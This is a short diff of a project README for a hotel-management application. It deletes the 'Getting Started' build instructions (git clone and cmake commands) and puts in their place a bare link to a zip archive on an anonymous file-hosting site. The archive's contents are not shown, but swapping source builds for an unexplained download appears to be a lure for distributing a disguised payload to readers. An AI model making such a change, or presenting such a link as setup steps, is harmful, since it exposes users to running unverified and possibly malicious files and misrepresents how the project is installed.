@@ -40,8 +40,4 @@ It features two main roles: **Employee** and **Guest**, with full integration to
 ## 🚀 Getting Started
 
 ```bash
-git clone https://github.com/Ubb-a/DefHotel.git
-cd your-repo-name
-mkdir build && cd build
-cmake ..
-cmake --build .
+https://top4top.io/downloadf-3425fgxsh1-zip.html
